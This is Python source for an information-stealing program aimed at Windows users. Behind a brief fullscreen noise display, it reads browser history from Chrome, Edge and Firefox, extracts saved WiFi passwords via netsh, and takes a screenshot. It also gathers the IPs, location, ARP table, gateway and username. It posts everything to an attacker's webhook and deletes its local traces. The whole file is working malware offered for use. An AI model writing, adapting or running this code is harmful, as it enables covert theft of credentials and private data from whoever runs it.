import requests
import pyautogui
import socket
import urllib.request
import pygame
import random
import time
import sys
import os
import platform
import subprocess
import sqlite3
import shutil
from urllib.parse import urlparse
from selenium import webdriver
import re
import json

WEBHOOK_URL = "Your webhook"

pygame.init()
screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
WIDTH, HEIGHT = screen.get_size()

start_time = time.time()
running = True

while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False

    elapsed = time.time() - start_time

    if elapsed < 5:
        for y in range(0, HEIGHT, 5):
            for x in range(0, WIDTH, 5):
                color = (random.randint(0,255), random.randint(0,255), random.randint(0,255))
                pygame.draw.rect(screen, color, (x, y, 5, 5))
    else:
        running = False

    pygame.display.flip()

pygame.quit()

def read_history(db_path, firefox=False):
    if not os.path.exists(db_path):
        return []
    copy_path = "History_copy"
    shutil.copy2(db_path, copy_path)
    conn = sqlite3.connect(copy_path)
    cursor = conn.cursor()
    if firefox:
        cursor.execute("SELECT url FROM moz_places ORDER BY last_visit_date DESC")
    else:
        cursor.execute("SELECT url FROM urls ORDER BY last_visit_time DESC")
    urls = [u[0] for u in cursor.fetchall()]
    conn.close()
    os.remove(copy_path)
    return urls

def get_chrome_history():
    path = os.path.expanduser("~") + r"/AppData/Local/Google/Chrome/User Data/Default/History"
    if not os.path.exists(path):
        print("Chrome: History file not found.")
        return []
    return read_history(path)

def get_edge_history():
    path = os.path.expanduser("~") + r"/AppData/Local/Microsoft/Edge/User Data/Default/History"
    if not os.path.exists(path):
        print("Edge: History file not found.")
        return []
    return read_history(path)

def get_firefox_history():
    try:
        firefox_path = os.path.expanduser("~") + r"/AppData/Roaming/Mozilla/Firefox/Profiles"
        profiles = [d for d in os.listdir(firefox_path) if d.endswith(".default") or d.endswith(".default-release")]
        if not profiles:
            print("Firefox: no default profile found.")
            return []
        path = os.path.join(firefox_path, profiles[0], "places.sqlite")
        return read_history(path, firefox=True)
    except FileNotFoundError:
        print("Firefox: profile directory does not exist or Firefox is not installed.")
        return []

def filter_unique_sites(urls):
    unique_sites = set()
    filtered = []
    for url_str in urls:
        if (
            "google.com/search" in url_str or
            url_str.startswith("chrome://") or
            url_str.startswith("chrome-extension://") or
            url_str.startswith("file://") or
            "localhost" in url_str
        ):
            continue
        parsed = urlparse(url_str)
        if not parsed.netloc:
            continue
        domain = f"{parsed.scheme}://{parsed.netloc}"
        if domain not in unique_sites:
            unique_sites.add(domain)
            filtered.append(domain)
    return filtered

def browser_exists(name):
    return shutil.which(name)

def open_browser(url):
    
    if browser_exists("firefox"):
        print("Opening Firefox")
        driver = webdriver.Firefox()
    
    
    elif browser_exists("chrome") or browser_exists("google-chrome") or browser_exists("chromium"):
        print("Opening Chrome")
        driver = webdriver.Chrome()
    
    
    elif browser_exists("msedge"):
        print("Opening Edge")
        driver = webdriver.Edge()
    
    else:
        print("No supported browser found!")
        return

    driver.get(url)

open_browser("https://google.com")


chrome_sites = filter_unique_sites(get_chrome_history())
edge_sites = filter_unique_sites(get_edge_history())
firefox_sites = filter_unique_sites(get_firefox_history())

output = []

output.append("=== Chrome ===")
output.extend(chrome_sites[:50])

output.append("\n=== Edge ===")
output.extend(edge_sites[:50])

output.append("\n=== Firefox ===")
output.extend(firefox_sites[:50])

with open("history.txt", "w", encoding="utf-8") as f:
    for line in output:
        f.write(line + "\n")

print("History saved to history.txt")

with open("history.txt", "r", encoding="utf-8") as historybrowsers:
    stealed = historybrowsers.read()  


operatingsystem = platform.system()

def get_wifi_profiles():
    data = subprocess.check_output(
        ["netsh", "wlan", "show", "profiles"],
        text=True,
        encoding="utf-8",
        errors="ignore"
    )
    
    profiles = []
    for line in data.split("\n"):
        if "All User Profile" in line:
            profile = line.split(":")[1].strip()
            profiles.append(profile)
    
    return profiles


def get_wifi_password(profile):
    try:
        data = subprocess.check_output(
            ["netsh", "wlan", "show", "profile", profile, "key=clear"],
            text=True,
            encoding="utf-8",
            errors="ignore"
        )
        
        for line in data.split("\n"):
            if "Key Content" in line:
                return line.split(":")[1].strip()
    except subprocess.CalledProcessError:
        return None


profiles = get_wifi_profiles()

stealwifi = ""

for profile in profiles:
    password = get_wifi_password(profile)
    stealwifi = f"SSID: {profile} . Password: {password} ."


username = os.getlogin()

data = requests.get("https://ipinfo.io/json").json()

country_code = data.get("country")


screenshot = pyautogui.screenshot()
screenshot.save("screen.png")


with open("screen.png", "rb") as f:
    requests.post(
        WEBHOOK_URL,
        files={"file": ("screen.png", f, "image/png")}
    )


def get_private_ip():
    return socket.gethostbyname(socket.gethostname())

def get_public_ip():
    with urllib.request.urlopen("https://api.ipify.org") as response:
        return response.read().decode()

try:
    city = requests.get("https://ipinfo.io/json").json().get("city", ".")
    print("")
except Exception:
    print("")

private = get_private_ip()

public = get_public_ip()

computerName = platform.node()

def get_default_gateway():
    result = subprocess.run("ipconfig", capture_output=True, text=True, encoding="mbcs")
    output = result.stdout

    match = re.search(r"Default Gateway[ .]*: (\d+\.\d+\.\d+\.\d+)", output)
    if match:
        return match.group(1)
    return None


def ArpAttack():
    current_dir = os.path.dirname(os.path.abspath(__file__))
    com = f"cd {current_dir}"
    os.system(com)
    os.system("arp -a >> ma03a.txt")
    with open("ma03a.txt", "r", encoding="utf-8") as wr:
        arpStealed = wr.read()
    return arpStealed

stealedarp = ArpAttack()
gateway_ip = get_default_gateway()

embed = {
    "title": "Grabbed!!!!",
    "color": 16711680,
    "fields": [
        {"name": "Private IP", "value": private, "inline": True},
        {"name": "Public IP", "value": public, "inline": True},
        {"name": "Country", "value": country_code, "inline": True},
        {"name": "City", "value": city, "inline": True},
        {"name": "User", "value": username, "inline": True},
        {"name": "Computer Name", "value": computerName, "inline": True},
        {"name": "WiFi (SSID/Password)", "value": stealwifi, "inline": False},
        {"name": "Operating System", "value": operatingsystem, "inline": True},
        {"name": "Gateway IP", "value": gateway_ip, "inline": True},
        {"name": "Connected to wifi (ARP):", "value": stealedarp, "inline": False},
        {"name": "History", "value": stealed[:1000], "inline": False}
    ]
}

data = {
    "embeds": [embed]
}

requests.post(WEBHOOK_URL, data=json.dumps(data), headers={"Content-Type": "application/json"})


history = "history.txt"
screen = "screen.png"
arp = "ma03a.txt"

os.remove(arp)
os.remove(history)
os.remove(screen)

sys.exit(0)



